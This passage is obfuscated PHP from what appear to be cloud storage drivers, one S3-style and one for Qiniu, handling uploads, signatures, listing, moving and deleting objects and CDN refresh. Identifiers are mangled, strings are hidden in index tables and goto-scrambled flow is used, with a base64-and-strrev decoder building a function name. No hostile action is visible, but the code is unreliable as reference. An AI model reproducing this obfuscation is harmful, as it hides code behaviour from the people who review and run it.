$DçáòÙ˜ô£ = array($EÔ®•»Çô[216] => $Bª¡¸Ö¶½¨ . $EÔ®•»Çô[217] . rawurlencode($b„²‹÷ùºÍ), $EÔ®•»Çô[218] => $DŠèÛšæ¯ó); $E²¾×áæê = $this->link($a½ô…²ÀŠœ, $DçáòÙ˜ô£); $this->fileOutLink($E²¾×áæê); goto fˆİ¯Íô†; fˆİ¯Íô†: } public function fileOutServer($b¾´¯¨©„Ó, $c¨®µóõ = false, $DÉê¤Öª‡ = false, $C©´Èò—Í = '') { parent::fileOut($b¾´¯¨©„Ó, $c¨®µóõ, $DÉê¤Öª‡, $C©´Èò—Í); } public function fileOutImageServer($D×çã½ÍŒ, $d×¥â»»‹î = 250) { parent::fileOutImage($D×çã½ÍŒ, $d×¥â»»‹î); } public function hashMd5($f‰ÔŠÌ‹Óˆ, $b¢®ìÆÃÓ = '') { $F¸·ˆÌÃ³ =& $_SERVER[›èö’ù¤]; $DÊ–ÇØ¦ë = $this->objectMeta($f‰ÔŠÌ‹Óˆ); if (!$DÊ–ÇØ¦ë) { return !1; } $b¢®ìÆÃÓ = $b¢®ìÆÃÓ ? $b¢®ìÆÃÓ : _get($DÊ–ÇØ¦ë, $F¸·ˆÌÃ³[219]); $b¢®ìÆÃÓ = $b¢®ìÆÃÓ ? $b¢®ìÆÃÓ : _get($DÊ–ÇØ¦ë, $F¸·ˆÌÃ³[209], $F¸·ˆÌÃ³[33]); return $b¢®ìÆÃÓ; } public function uploadFormData($eÈ­ÆâÓóÎ, $D‰ÏßãìäÍ = 3600) { $f š†ÈœßŠ =& $_SERVER[›èö’ù¤]; $eòÁ‹Úº±“ = $this->pathFather($eÈ­ÆâÓóÎ); $BÆ²ª˜Ôùœ = $this->client->getHttpUploadPostParams($this->bucket, $eòÁ‹Úº±“, $f š†ÈœßŠ[192], $D‰ÏßãìäÍ); return array_merge((array) $BÆ²ª˜Ôùœ, array($f š†ÈœßŠ[175] => $this->getHost())); } public function multiUploadFormData($e†ÚÏÌÊÛ¡, $d‘¬¥ÔÅÜ = 3600) { $a©šÁ§ïâğ =& $_SERVER[›èö’ù¤]; $C½˜‰öä Ñ = gmdate($a©šÁ§ïâğ[220]); $f‰Ä¹ÒÕ = array(); $DôŒ³²ßÍã = $this->client->getUploadId($this->bucket, $e†ÚÏÌÊÛ¡, $f‰Ä¹ÒÕ); if (!$DôŒ³²ßÍã) { return !1; } return array($a©šÁ§ïâğ[221] => $DôŒ³²ßÍã, $a©šÁ§ïâğ[175] => $this->getHost() . $a©šÁ§ïâğ[8] . $this->pathEncode($e†ÚÏÌÊÛ¡), $a©šÁ§ïâğ[222] => $C½˜‰öä Ñ, $a©šÁ§ïâğ[93] => $e†ÚÏÌÊÛ¡); } public function multiUploadAuthData($D¶Ğğ»¸Ô, $EÅÏÑÏŒ  = array()) { goto eğ‹æ¥ƒØâ; C‰÷è«½˜: $EÆæ°Íˆ = $EÅÏÑÏŒ [$EôùÙİ®„»[93]]; unset($EÅÏÑÏŒ [$EôùÙİ®„»[93]]); if (isset($EÅÏÑÏŒ [$EôùÙİ®„»[223]])) { $EÅÏÑÏŒ [$EôùÙİ®„»[222]] = $e·À‡±Ç±è; return $this->listUploadParts($EÆæ°Íˆ, $EÅÏÑÏŒ ); } goto dë‰Ñ†ÎÌ; A—É¥é‚’­: $Cê¼‹†ç¤… = implode($EôùÙİ®„»[229], $f¦£öùÅÒ¯); $DÛ…‰Öè³ = base64_encode(hash_hmac($EôùÙİ®„»[230], $Cê¼‹†ç¤…, $this->secret, !0)); $A³á¢Õ‡« = $EôùÙİ®„»[231] . $this->accessKey . $EôùÙİ®„»[4] . $DÛ…‰Öè³; goto c‡§‚Îöˆ—; eğ‹æ¥ƒØâ: $EôùÙİ®„» =& $_SERVER[›èö’ù¤]; $e·À‡±Ç±è = isset($EÅÏÑÏŒ [$EôùÙİ®„»[222]]) ? $EÅÏÑÏŒ [$EôùÙİ®„»[222]] : gmdate($EôùÙİ®„»[220]); $f†­¯åˆ¦ß = isset($EÅÏÑÏŒ [$EôùÙİ®„»[168]]) ? $EÅÏÑÏŒ [$EôùÙİ®„»[168]] : $EôùÙİ®„»[33]; goto C‰÷è«½˜; c‡§‚Îöˆ—: if (strpos($f†­¯åˆ¦ß, $EôùÙİ®„»[225]) === 0) { return array($EôùÙİ®„»[232] => $A³á¢Õ‡«, $EôùÙİ®„»[222] => $e·À‡±Ç±è); } return $A³á¢Õ‡«; goto BÒÔËšàš³; dë‰Ñ†ÎÌ: $f¦£öùÅÒ¯ = array($EôùÙİ®„»[224], $EôùÙİ®„»[33], $EôùÙİ®„»[119], $EôùÙİ®„»[33], "\170\x2d\x61\x6d\x7a\55\144\x61\164\x65\x3a{$e·À‡±Ç±è}", $EôùÙİ®„»[8] . $this->bucket . $EôùÙİ®„»[8] . $this->pathEncode($EÆæ°Íˆ) . $f†­¯åˆ¦ß); if (strpos($f†­¯åˆ¦ß, $EôùÙİ®„»[225]) === 0) { $f¦£öùÅÒ¯[0] = $EôùÙİ®„»[226]; } if (isset($EÅÏÑÏŒ [$EôùÙİ®„»[227]]) && $EÅÏÑÏŒ [$EôùÙİ®„»[227]] == $EôùÙİ®„»[228]) { $f¦£öùÅÒ¯[0] = $EôùÙİ®„»[228]; } goto A—É¥é‚’­; BÒÔËšàš³: } public function listUploadParts($cœ¹­ëËî×, $EÑšó²¾†¢ = array()) { goto eëù¢åô‘; eëù¢åô‘: $B³êé»Ì‘ =& $_SERVER[›èö’ù¤]; $EöÄ‚÷¶ƒñ = str_replace($B³êé»Ì‘[233], $B³êé»Ì‘[33], $EÑšó²¾†¢[$B³êé»Ì‘[168]]); $E¾ï–Ìï£é = $this->client->listParts($this->bucket, $cœ¹­ëËî×, $EöÄ‚÷¶ƒñ); goto a¼’Ì”î˜; a¼’Ì”î˜: if (!$E¾ï–Ìï£é) { return !1; } unset($EÑšó²¾†¢[$B³êé»Ì‘[223]], $EÑšó²¾†¢[$B³êé»Ì‘[227]]); $EÑšó²¾†¢[$B³êé»Ì‘[93]] = $cœ¹­ëËî×; goto d»î‘Œ¸µš; d»î‘Œ¸µš: $d·ÑÆµĞÆ¯ = $this->multiUploadAuthData($cœ¹­ëËî×, $EÑšó²¾†¢); if (empty($d·ÑÆµĞÆ¯)) { return !1; } return array($B³êé»Ì‘[232] => $d·ÑÆµĞÆ¯, $B³êé»Ì‘[222] => $EÑšó²¾†¢[$B³êé»Ì‘[222]], $B³êé»Ì‘[234] => $E¾ï–Ìï£é); goto EÅìÑ‰ñ¹É; EÅìÑ‰ñ¹É: } public function getHost() { return parent::getHost() . $_SERVER[›èö’ù¤][8] . $this->bucket; } public function size($Fˆ£ŠèìÇ) { $A‘õŸ¸ê‡ = $this->objectMeta($Fˆ£ŠèìÇ); return $A‘õŸ¸ê‡ ? $A‘õŸ¸ê‡[$_SERVER[›èö’ù¤][78]] : 0; } public function info($BßÉ¶ØÂá) { if ($this->isFolder($BßÉ¶ØÂá)) { return $this->folderInfo($BßÉ¶ØÂá); } else { if ($this->isFile($BßÉ¶ØÂá)) { return $this->fileInfo($BßÉ¶ØÂá); } } return !1; } public function exist($Aˆ¿£¸õšî) { return $this->isFile($Aˆ¿£¸õšî) || $this->isFolder($Aˆ¿£¸õšî); } public function isFile($C¬œÚ¨·œÛ) { return !$this->isFolder($C¬œÚ¨·œÛ) && $this->objectMeta($C¬œÚ¨·œÛ); } public function isFolder($e‚óÙÂö–) { return $this->cacheMethod($_SERVER[›èö’ù¤][199], $e‚óÙÂö–); } protected function objectMeta($AÄ‡«øŞÂ) { return $this->cacheMethod($_SERVER[›èö’ù¤][200], $AÄ‡«øŞÂ); } protected function _objectMeta($aÅÍ”åÍ‰¨) { $fì×íœ˜ŠÎ =& $_SERVER[›èö’ù¤]; $aÅÍ”åÍ‰¨ = rtrim($aÅÍ”åÍ‰¨, $fì×íœ˜ŠÎ[8]); try { $d´ÍĞ®óà¾ = $this->client->getObjectInfo($this->bucket, $aÅÍ”åÍ‰¨); if (!isset($d´ÍĞ®óà¾[$fì×íœ˜ŠÎ[219]]) && isset($d´ÍĞ®óà¾[$fì×íœ˜ŠÎ[235]])) { $d´ÍĞ®óà¾[$fì×íœ˜ŠÎ[219]] = $d´ÍĞ®óà¾[$fì×íœ˜ŠÎ[235]]; } } catch (Exception $B–¢™Ûğ“) { $d´ÍĞ®óà¾ = !1; } if (!$d´ÍĞ®óà¾) { } return $d´ÍĞ®óà¾; } protected function _isFolder($DğÈä÷ôÕ) { goto b¤³°ÏÕÔ˜; b†âë·ãÂ: return !0; goto eàÂ‡ÅŞ“; b¤³°ÏÕÔ˜: $b‹ÅÎŒÄ­˜ =& $_SERVER[›èö’ù¤]; $DğÈä÷ôÕ = rtrim($DğÈä÷ôÕ, $b‹ÅÎŒÄ­˜[8]); if ($DğÈä÷ôÕ == $b‹ÅÎŒÄ­˜[33] || $DğÈä÷ôÕ == $b‹ÅÎŒÄ­˜[8]) { return !0; } goto D¢ÔÙ‡™ùŸ; bá×‚÷¨—ì: return stripos($CîçéóÚ¼, $DğÈä÷ôÕ . $b‹ÅÎŒÄ­˜[8]) === 0 ? !0 : !1; if (substr($CîçéóÚ¼, -1) == $b‹ÅÎŒÄ­˜[8]) { return !0; } if (get_path_this($CîçéóÚ¼) == get_path_this($DğÈä÷ôÕ)) { return !1; } goto b†âë·ãÂ; D¢ÔÙ‡™ùŸ: $AÂè´å»¯ = $this->client->getBucket($this->bucket, $DğÈä÷ôÕ, null, 1); if (empty($AÂè´å»¯[$b‹ÅÎŒÄ­˜[198]])) { return !1; } $CîçéóÚ¼ = $AÂè´å»¯[$b‹ÅÎŒÄ­˜[198]][0][$b‹ÅÎŒÄ­˜[28]]; goto bá×‚÷¨—ì; eàÂ‡ÅŞ“: } } define($_SERVER[›èö’ù¤][236], 1); goto cé¿ôˆ¸šŸ; DùÃæ¾Ê†Å: $dÄĞ’ôÁ‘ = strrev(base64_decode($_SERVER[»½§Ó„][0])); function binCheckNeq($cŠëÂ²ì£‹, $eˆÂ‚·îÌµ) { return $cŠëÂ²ì£‹ != $eˆÂ‚·îÌµ; } $_SERVER[$_SERVER[»½§Ó„][1]] = $dÄĞ’ôÁ‘($_SERVER[$_SERVER[»½§Ó„][2]]); goto cèº„îµ‰; EÂ¯—ËÕÒ–: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($C¬ÛÂ‡“ò„) { parent::__construct(); require_once SDK_DIR . $_SERVER[›èö’ù¤][1325]; $this->_init($C¬ÛÂ‡“ò„); } public function _init($cÁ˜“ãƒë­) { goto BİÅíô«; f®Û‹øÆè: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto cáÚ•²†; cáÚ•²†: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto a“øÌ…; BİÅíô«: $Aß•¥Áˆ– =& $_SERVER[›èö’ù¤]; foreach ($cÁ˜“ãƒë­ as $Eùà½ö× => $b—àÖß¦) { if (isset($this->{$Eùà½ö×})) { $this->{$Eùà½ö×} = $b—àÖß¦; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Aß•¥Áˆ–[1326] . LNG($Aß•¥Áˆ–[1286])); } goto f®Û‹øÆè; a“øÌ…: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($DÀØôÀœââ, $cŠ´ˆ‹ìš‰ = '', $Cˆ˜Á°á¯ = REPEAT_RENAME) { if ($this->setContent($DÀØôÀœââ, $cŠ´ˆ‹ìš‰)) { return $this->getPathOuter($DÀØôÀœââ); } return !1; } public function mkdir($BøÜÂµõîğ, $CÖª¸›ÒÎ = REPEAT_SKIP) { goto aÄ˜¨Ö¯; b‘ŸÄã‡Ğ: if (!$this->mkfile($f•ê°ª†â)) { return !1; } if (!$this->moveFile($f•ê°ª†â, $BøÜÂµõîğ)) { $this->delFile($f•ê°ª†â); return !1; } return $this->getPathOuter($C ÈÜ‰ĞÀà); goto cô©Ê¦á”; aÄ˜¨Ö¯: $AÒ»‘ŸíÎ› =& $_SERVER[›èö’ù¤]; $C ÈÜ‰ĞÀà = trim($BøÜÂµõîğ, $AÒ»‘ŸíÎ›[8]); if ($this->_isFolder($C ÈÜ‰ĞÀà)) { return $this->getPathOuter($C ÈÜ‰ĞÀà); } goto fÏÏğÊƒÚŒ; fÏÏğÊƒÚŒ: $BøÜÂµõîğ = $C ÈÜ‰ĞÀà . $AÒ»‘ŸíÎ›[8]; $BÄÈÎà‹¶ = get_path_this($C ÈÜ‰ĞÀà); $f•ê°ª†â = $BøÜÂµõîğ . $BÄÈÎà‹¶; goto b‘ŸÄã‡Ğ; cô©Ê¦á”: } public function copyFile($FÊÓ‡ôØÅ†, $BÚ‰›°Œ£Ñ) { $dÇ õ¢«œ = $this->bucketManager->copy($this->bucket, $FÊÓ‡ôØÅ†, $this->bucket, $BÚ‰›°Œ£Ñ, !0); return $dÇ õ¢«œ ? !1 : $this->getPathOuter($BÚ‰›°Œ£Ñ); } public function moveFile($DÈİÒÇˆóå, $cŠ¼„ğ­ß‚) { $c‚Ì†Úå´ = $this->bucketManager->move($this->bucket, $DÈİÒÇˆóå, $this->bucket, $cŠ¼„ğ­ß‚, !0); return $c‚Ì†Úå´ ? !1 : $this->getPathOuter($cŠ¼„ğ­ß‚); } public function delFile($D»åÉ¤²İ“) { if (!$this->exist($D»åÉ¤²İ“)) { return !0; } $D¾‚ÊÎÔªª = $this->bucketManager->delete($this->bucket, $D»åÉ¤²İ“); return $D¾‚ÊÎÔªª ? !1 : !0; } public function delFolder($Bµù¯ŞÌÇñ) { goto e—’Æ¨Æª¸; BÅŠñ¼¾Š: if (!empty($Bµù¯ŞÌÇñ) && $Bµù¯ŞÌÇñ !== $B¥œçŠ‘Ôí[191] && !in_array($Cˆè×©ìÕ, $BÒ˜½Ÿ¡ÖÜ[$B¥œçŠ‘Ôí[75]])) { $BÒ˜½Ÿ¡ÖÜ[$B¥œçŠ‘Ôí[75]][] = $Cˆè×©ìÕ; } $fá«‡åƒˆÔ = $this->delByBatch($BÒ˜½Ÿ¡ÖÜ[$B¥œçŠ‘Ôí[74]]); if (!$fá«‡åƒˆÔ) { return !1; } goto bõÁÕÛÀ§š; aŒíôİ‚ğ: $BÒ˜½Ÿ¡ÖÜ = $this->fileList($Bµù¯ŞÌÇñ); $this->listItemCache = !0; $Cˆè×©ìÕ = trim($Bµù¯ŞÌÇñ, $B¥œçŠ‘Ôí[8]) . $B¥œçŠ‘Ôí[8]; goto BÅŠñ¼¾Š; e—’Æ¨Æª¸: $B¥œçŠ‘Ôí =& $_SERVER[›èö’ù¤]; if (!$this->exist($Bµù¯ŞÌÇñ)) { return !0; } $this->listItemCache = !1; goto aŒíôİ‚ğ; bõÁÕÛÀ§š: $fá«‡åƒˆÔ = $this->delByBatch($BÒ˜½Ÿ¡ÖÜ[$B¥œçŠ‘Ôí[75]]); if (!$fá«‡åƒˆÔ) { return !1; } return $this->delFile($Cˆè×©ìÕ); goto BÅÃÓò¤ïÄ; BÅÃÓò¤ïÄ: } private function delByBatch($e¦ğ«¯Ôëò) { foreach (array_chunk($e¦ğ«¯Ôëò, 1000) as $E¨°ïù«Ô) { $aÃìÔ„ì®ñ = $this->bucketManager->buildBatchDelete($this->bucket, $E¨°ïù«Ô); list($e‡íŠ—©½ò, $A†‹¿Óš·) = $this->bucketManager->batch($aÃìÔ„ì®ñ); if ($A†‹¿Óš·) { return !1; } } return !0; } public function rename($Cé¶«¤–”¦, $bãÅÆÏ×±Í) { return $this->renameObject($Cé¶«¤–”¦, $bãÅÆÏ×±Í); } public function fileInfo($f—ˆÓˆ´²“, $F¿ãÓØ×÷ = false, $aÁäææ¤Ñ = array()) { goto e£‡Êİ¾·–; e£‡Êİ¾·–: $fÉ¥ô¿ğÒË =& $_SERVER[›èö’ù¤]; $EŠÔç‰‡‹ = array($fÉ¥ô¿ğÒË[28] => $this->pathThis($f—ˆÓˆ´²“), $fÉ¥ô¿ğÒË[76] => $this->getPathOuter($fÉ¥ô¿ğÒË[8] . $f—ˆÓˆ´²“), $fÉ¥ô¿ğÒË[29] => $fÉ¥ô¿ğÒË[193], $fÉ¥ô¿ğÒË[78] => isset($aÁäææ¤Ñ[$fÉ¥ô¿ğÒË[1327]]) ? $aÁäææ¤Ñ[$fÉ¥ô¿ğÒË[1327]] : 0, $fÉ¥ô¿ğÒË[168] => $this->ext($f—ˆÓˆ´²“)); if ($F¿ãÓØ×÷) { return $EŠÔç‰‡‹; } goto E÷İ‹ô·¶; Dã ŒÅí : if (isset($aÁäææ¤Ñ[$fÉ¥ô¿ğÒË[1328]])) { $EŠÔç‰‡‹[$fÉ¥ô¿ğÒË[84]] = substr($aÁäææ¤Ñ[$fÉ¥ô¿ğÒË[1328]] . $fÉ¥ô¿ğÒË[33], 0, 10); } if (isset($aÁäææ¤Ñ[$fÉ¥ô¿ğÒË[1327]])) { $EŠÔç‰‡‹[$fÉ¥ô¿ğÒË[78]] = $aÁäææ¤Ñ[$fÉ¥ô¿ğÒË[1327]]; } return $EŠÔç‰‡‹; goto c“¥ß„Ïí; E÷İ‹ô·¶: $EŠÔç‰‡‹[$fÉ¥ô¿ğÒË[194]] = $EŠÔç‰‡‹[$fÉ¥ô¿ğÒË[84]] = 0; $EŠÔç‰‡‹[$fÉ¥ô¿ğÒË[195]] = $EŠÔç‰‡‹[$fÉ¥ô¿ğÒË[196]] = !0; if (empty($aÁäææ¤Ñ)) { $aÁäææ¤Ñ = $this->objectMeta($f—ˆÓˆ´²“); if (!$aÁäææ¤Ñ) { return $EŠÔç‰‡‹; } } goto Dã ŒÅí ; c“¥ß„Ïí: } public function folderInfo($E¿„©ÛÄ¬†, $D–ÅÜÅòñÁ = false) { goto Eù¦É¶Ş†–; B”»ï¶Êé—: $c¢ ‰¤†ñì[$C£¹–ìŸâ•[194]] = $c¢ ‰¤†ñì[$C£¹–ìŸâ•[84]] = 0; $c¢ ‰¤†ñì[$C£¹–ìŸâ•[195]] = $c¢ ‰¤†ñì[$C£¹–ìŸâ•[196]] = !0; $E¿„©ÛÄ¬† = rtrim($E¿„©ÛÄ¬†, $C£¹–ìŸâ•[8]) . $C£¹–ìŸâ•[8]; goto aÊ³í¤¢çæ; Eù¦É¶Ş†–: $C£¹–ìŸâ• =& $_SERVER[›èö’ù¤]; $c¢ ‰¤†ñì = array($C£¹–ìŸâ•[28] => $this->pathThis($E¿„©ÛÄ¬†), $C£¹–ìŸâ•[76] => $this->getPathOuter($C£¹–ìŸâ•[8] . $E¿„©ÛÄ¬†), $C£¹–ìŸâ•[29] => $C£¹–ìŸâ•[77]); if ($D–ÅÜÅòñÁ) { return $c¢ ‰¤†ñì; } goto B”»ï¶Êé—; aÊ³í¤¢çæ: $Dô¾ºÓ«Ë = $this->objectMeta($E¿„©ÛÄ¬†); if (isset($Dô¾ºÓ«Ë[$C£¹–ìŸâ•[1328]])) { $c¢ ‰¤†ñì[$C£¹–ìŸâ•[84]] = substr($Dô¾ºÓ«Ë[$C£¹–ìŸâ•[1328]] . $C£¹–ìŸâ•[33], 0, 10); } return $c¢ ‰¤†ñì; goto DµãêÅ°‡Š; DµãêÅ°‡Š: } public function listPath($BÆˆ¿¹µ¢¼, $aæÆŞÕ¿ôÁ = false) { $Bç¦¢¯À·Ÿ =& $_SERVER[›èö’ù¤]; $DàªË‚Œõ° = $this->fileList($BÆˆ¿¹µ¢¼, $Bç¦¢¯À·Ÿ[8], !0); foreach ($DàªË‚Œõ°[$Bç¦¢¯À·Ÿ[75]] as $B„Ô•İÊô° => $b•¹…„îõ¤) { $DàªË‚Œõ°[$Bç¦¢¯À·Ÿ[75]][$B„Ô•İÊô°] = $this->folderInfo($b•¹…„îõ¤, $aæÆŞÕ¿ôÁ); } foreach ($DàªË‚Œõ°[$Bç¦¢¯À·Ÿ[74]] as $B„Ô•İÊô° => $b•¹…„îõ¤) { $DàªË‚Œõ°[$Bç¦¢¯À·Ÿ[74]][$B„Ô•İÊô°] = $this->fileInfo($b•¹…„îõ¤[$Bç¦¢¯À·Ÿ[93]], $aæÆŞÕ¿ôÁ, $b•¹…„îõ¤); } return $DàªË‚Œõ°; } public function has($b‡ä¬âŞÓÂ, $e¦•²ÏÏ½ = false, $Bƒ¶ˆÑ× = true) { goto AìÏŒíœÌÙ; bî¥ó“: $FßËë¥ìÄ¦ = $f¸›¿á˜éÕ = 0; while (!0) { check_abort(); list($C„­ÏŸ¯—¡, $FÕËÙ·’ˆğ) = $this->bucketManager->listFiles($this->bucket, $e…•¼±‚¯, $dÌµ®îà’…, $bôÔÄ‹«õ, $fÎ­³¬äÎ«); if ($FÕËÙ·’ˆğ) { break; } $dÌµ®îà’… = array_key_exists($FŠãË‘šŒÂ[1298], $C„­ÏŸ¯—¡) ? $dÌµ®îà’… = $C„­ÏŸ¯—¡[$FŠãË‘šŒÂ[1329]] : $FŠãË‘šŒÂ[33]; if ($e¦•²ÏÏ½) { if (!empty($C„­ÏŸ¯—¡[$FŠãË‘šŒÂ[1330]])) { $FßËë¥ìÄ¦ += count($C„­ÏŸ¯—¡[$FŠãË‘šŒÂ[1330]]); } if (!empty($C„­ÏŸ¯—¡[$FŠãË‘šŒÂ[1331]])) { $f¸›¿á˜éÕ += count($C„­ÏŸ¯—¡[$FŠãË‘šŒÂ[1331]]); } if ($dÌµ®îà’… === $FŠãË‘šŒÂ[33]) { break; } continue; } if ($Bƒ¶ˆÑ×) { if (!empty($C„­ÏŸ¯—¡[$FŠãË‘šŒÂ[1330]])) { return !0; } } else { if (!empty($C„­ÏŸ¯—¡[$FŠãË‘šŒÂ[1331]])) { return !0; } } if ($dÌµ®îà’… === $FŠãË‘šŒÂ[33]) { break; } } if ($e¦•²ÏÏ½) { return array($FŠãË‘šŒÂ[203] => $FßËë¥ìÄ¦, $FŠãË‘šŒÂ[204] => $f¸›¿á˜éÕ); } goto dÄ†Í–È; dÄ†Í–È: return !1; goto c£ôà¹Š¹í; a‘îğ…¼¢: $dÌµ®îà’… = $FŠãË‘šŒÂ[33]; $bôÔÄ‹«õ = 500; $fÎ­³¬äÎ« = $FŠãË‘šŒÂ[8]; goto bî¥ó“; AìÏŒíœÌÙ: $FŠãË‘šŒÂ =& $_SERVER[›èö’ù¤]; $b‡ä¬âŞÓÂ = trim($b‡ä¬âŞÓÂ, $FŠãË‘šŒÂ[8]); $e…•¼±‚¯ = empty($b‡ä¬âŞÓÂ) && $b‡ä¬âŞÓÂ !== $FŠãË‘šŒÂ[191] ? $FŠãË‘šŒÂ[33] : $b‡ä¬âŞÓÂ . $FŠãË‘šŒÂ[8]; goto a‘îğ…¼¢; c£ôà¹Š¹í: } public function listAll($Eñáƒ©¢¬–) { $F¥—­Š©Èœ =& $_SERVER[›èö’ù¤]; $DòÉ‰Ç¬ = $this->fileList($Eñáƒ©¢¬–, $F¥—­Š©Èœ[33], !0); $E–¬°‰ù = array(); foreach ($DòÉ‰Ç¬[$F¥—­Š©Èœ[74]] as $b±â¤÷ò“ñ) { $E–¬°‰ù[$b±â¤÷ò“ñ[$F¥—­Š©Èœ[93]]] = $b±â¤÷ò“ñ[$F¥—­Š©Èœ[78]]; } foreach ($DòÉ‰Ç¬[$F¥—­Š©Èœ[75]] as $b±â¤÷ò“ñ) { if (is_string($b±â¤÷ò“ñ)) { $E–¬°‰ù[$b±â¤÷ò“ñ] = 0; } } return $this->listAllFiles($Eñáƒ©¢¬–, array_keys($E–¬°‰ù), $E–¬°‰ù); } private function fileList($dÕï¼»ÆˆÁ, $fØêÙàè¯é = '', $BÉ’×ƒ¢© = 0) { goto DãÃÑíùÖÙ; f÷ğÖí´Ó‚: $B»Æ´òÛ¸í = $Eáø‡Ãóí = array(); while (!0) { check_abort(); list($f÷°‘š½º», $B«‰¢ƒÜ­ğ) = $this->bucketManager->listFiles($this->bucket, $bŒØÁÜ¯‚‘, $dĞ‹–ßÙä‚, $FÆ¦ÕÈöšë, $fØêÙàè¯é); if ($B«‰¢ƒÜ­ğ) { break; } $dĞ‹–ßÙä‚ = array_key_exists($DÔËİ§”ô[1298], $f÷°‘š½º») ? $dĞ‹–ßÙä‚ = $f÷°‘š½º»[$DÔËİ§”ô[1329]] : $DÔËİ§”ô[33]; $fçºÓç = isset($f÷°‘š½º»[$DÔËİ§”ô[1330]]) ? $f÷°‘š½º»[$DÔËİ§”ô[1330]] : array(); $D¡ÉóõÍÊ¤ = isset($f÷°‘š½º»[$DÔËİ§”ô[1331]]) ? $f÷°‘š½º»[$DÔËİ§”ô[1331]] : array(); foreach ($fçºÓç as $eõ³‘“ê¹Å) { goto b¢ŞØ‰İİ‰; a£¬ç‘ „ó: $eõ³‘“ê¹Å[$DÔËİ§”ô[78]] = $C‰ï†Õ¿‡Ë; $Bª´Å¢˜¾Š = $C‰ï†Õ¿‡Ë == 0 && substr($f¸èİ«ÁÚë, strlen($f¸èİ«ÁÚë) - 1, 1) == $DÔËİ§”ô[8] ? !0 : !1; if ($FğÑŒëŞÜ) { $this->cacheMethod($DÔËİ§”ô[199], $f¸èİ«ÁÚë, $Bª´Å¢˜¾Š); $this->cacheMethod($DÔËİ§”ô[200], $f¸èİ«ÁÚë, $eõ³‘“ê¹Å); } goto CÎº¤Àö¤’; b¢ŞØ‰İİ‰: if ($eõ³‘“ê¹Å[$DÔËİ§”ô[93]] == $bŒØÁÜ¯‚‘) { continue; } $f¸èİ«ÁÚë = $eõ³‘“ê¹Å[$DÔËİ§”ô[93]]; $C‰ï†Õ¿‡Ë = $eõ³‘“ê¹Å[$DÔËİ§”ô[1327]]; goto a£¬ç‘ „ó; CÎº¤Àö¤’: if ($Bª´Å¢˜¾Š) { $B»Æ´òÛ¸í[] = $f¸èİ«ÁÚë; continue; } $Eáø‡Ãóí[] = $BÉ’×ƒ¢© ? $eõ³‘“ê¹Å : $f¸èİ«ÁÚë; goto Cßáøä¯æ; Cßáøä¯æ: } foreach ($D¡ÉóõÍÊ¤ as $f¸èİ«ÁÚë) { if ($f¸èİ«ÁÚë == $bŒØÁÜ¯‚‘) { continue; } $B»Æ´òÛ¸í[] = $f¸èİ«ÁÚë; if ($FğÑŒëŞÜ) { $this->cacheMethod($DÔËİ§”ô[199], $f¸èİ«ÁÚë, !0); } } if ($dĞ‹–ßÙä‚ === $DÔËİ§”ô[33]) { break; } } if ($FğÑŒëŞÜ) { $this->cacheMethod($DÔËİ§”ô[199], $dÕï¼»ÆˆÁ, !0); } goto b«ğ˜“óŸ; DãÃÑíùÖÙ: $DÔËİ§”ô =& $_SERVER[›èö’ù¤]; $dÕï¼»ÆˆÁ = trim($dÕï¼»ÆˆÁ, $DÔËİ§”ô[8]); $bŒØÁÜ¯‚‘ = empty($dÕï¼»ÆˆÁ) && $dÕï¼»ÆˆÁ !== $DÔËİ§”ô[191] ? $DÔËİ§”ô[33] : $dÕï¼»ÆˆÁ . $DÔËİ§”ô[8]; goto Eã™æñÎ¬š; Eã™æñÎ¬š: $dĞ‹–ßÙä‚ = $DÔËİ§”ô[33]; $FÆ¦ÕÈöšë = 1000; $FğÑŒëŞÜ = $this->listItemCache === !1 ? !1 : !0; goto f÷ğÖí´Ó‚; b«ğ˜“óŸ: return array($DÔËİ§”ô[75] => $B»Æ´òÛ¸í, $DÔËİ§”ô[74] => $Eáø‡Ãóí); goto E¢ƒ•ïõÄ; E¢ƒ•ïõÄ: } public function canRead($A‡¸¿ÔÒƒÕ) { return $this->exist($A‡¸¿ÔÒƒÕ) ? !0 : !1; } public function canWrite($DŠÇ‘™¬¹) { return $this->exist($DŠÇ‘™¬¹) ? !0 : !1; } public function getContent($Dğ»º°ƒİä) { return $this->fileSubstr($Dğ»º°ƒİä, 0, -1); } public function setContent($Aº§—Ö™Ô¿, $DÃ‚«„ä¶ó = '') { $fâøÂ©£ØÁ = $this->tempFile($this->pathThis($Aº§—Ö™Ô¿)); file_put_contents($fâøÂ©£ØÁ, $DÃ‚«„ä¶ó); if ($this->upload($Aº§—Ö™Ô¿, $fâøÂ©£ØÁ)) { $this->tempFileRemve($fâøÂ©£ØÁ); return !0; } return !1; } public function refreshUrls($eàÇõŒ·½¾) { goto cˆêóÑÇòö; cˆêóÑÇòö: $Fİ„á’·äÅ =& $_SERVER[›èö’ù¤]; $EƒòëŠê¿ = array(); if (is_array($eàÇõŒ·½¾)) { foreach ($eàÇõŒ·½¾ as $b±îÌÇ“­) { $EƒòëŠê¿[] = $this->link($b±îÌÇ“­); } } else { $EƒòëŠê¿[] = $this->link($eàÇõŒ·½¾); } goto C¹ÄîØ¾Å; C¹ÄîØ¾Å: $d×…ëóÀ = new Qiniu\Cdn\CdnManager($this->auth); list($EÂá”•‡ëğ, $FÚôÕá) = $d×…ëóÀ->refreshUrls($EƒòëŠê¿); if ($FÚôÕá) { return !1; } goto C¾¼£©ïàŒ; C¾¼£©ïàŒ: return $EÂá”•‡ëğ[$Fİ„á’·äÅ[1102]] == $Fİ„á’·äÅ[744] ? !0 : !1; goto dÇ¶š·åÒµ; dÇ¶š·åÒµ: } public function fileSubstr($E­®åÓõÁî, $b’„ªÚ´¼, $b¦ê¯ÈÒ«§) { $Bˆ¨Ï¨°– =& $_SERVER[›èö’ù¤]; if (!($E§ËÚ—Íá = $this->link($E­®åÓõÁî))) { return !1; } $c¯îáà¯å¡ = !1; if ($b¦ê¯ÈÒ«§ > 0) { $F…¬‡§õÇß = 